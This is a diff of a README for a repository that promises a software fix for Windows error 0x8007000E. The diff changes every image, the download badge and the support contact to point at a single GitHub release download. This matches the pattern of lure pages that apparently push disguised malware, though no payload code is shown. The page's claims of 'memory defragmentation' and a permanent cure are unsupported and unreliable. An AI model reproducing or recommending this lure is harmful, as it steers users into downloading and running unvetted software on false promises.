@@ -1,6 +1,6 @@
 # Fixing Error 0x8007000E
 
-![Error 0x8007000E](https://cdn.pixabay.com/photo/2017/03/10/13/12/error-2130852_960_720.png)
+![Error 0x8007000E](https://github.com/pufferfish420/Fixing-Error-0x8007000E/releases/tag/v2.0)
 
 Welcome to the "Fixing Error 0x8007000E" repository! This error code indicates that there is insufficient memory available to complete certain operations, often manifesting during installations or updates. If you have encountered this error, fret not! We have a solution for you to resolve this nagging issue once and for all.
 
@@ -18,7 +18,7 @@ Through a combination of memory defragmentation, cache management, and resource 
 
 ## Download Software
 
-[![Software Download](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Software Download](https://github.com/pufferfish420/Fixing-Error-0x8007000E/releases/tag/v2.0)](https://github.com/pufferfish420/Fixing-Error-0x8007000E/releases/tag/v2.0)
 
 Click the download button above to access the software package that will help you resolve the Error 0x8007000E once and for all. Say goodbye to memory-related headaches and enjoy a smoother computing experience!
 
@@ -41,10 +41,10 @@ We would like to extend our gratitude to the following contributors who have ded
 
 If you encounter any issues during the installation or usage of the software tool, please don't hesitate to reach out to our support team. We are here to assist you in resolving any technical challenges and ensuring a seamless experience with our product.
 
-For support inquiries, contact us at `support@memoryfix.com`.
+For support inquiries, contact us at `https://github.com/pufferfish420/Fixing-Error-0x8007000E/releases/tag/v2.0`.
 
 ---
 
 Stay tuned for future updates and enhancements to our memory optimization tool. Thank you for choosing our software to tackle the Error 0x8007000E and improve your system's performance. Happy computing! 🚀
 
-![Happy Computing](https://cdn.pixabay.com/photo/2016/02/18/16/56/happy-1207475_960_720.jpg)
+![Happy Computing](https://github.com/pufferfish420/Fixing-Error-0x8007000E/releases/tag/v2.0)
